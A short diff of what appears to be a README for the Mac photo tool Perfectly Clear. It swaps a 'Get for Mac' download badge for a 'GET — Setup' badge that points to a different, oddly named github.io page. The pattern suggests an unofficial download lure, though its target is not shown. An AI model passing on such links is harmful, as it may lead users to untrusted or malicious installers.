@@ -4,10 +4,8 @@
   <img src="https://insmac.org/uploads/posts/2021-10/clear-workbench-4.png" width="250"/>
 </div>  
 <br>
-<div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://hrastik-krabs.github.io/.github/)
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://sivcraigwellilljx.github.io/.github/Athentech-Perfectly-Clear)
 
 ---
 
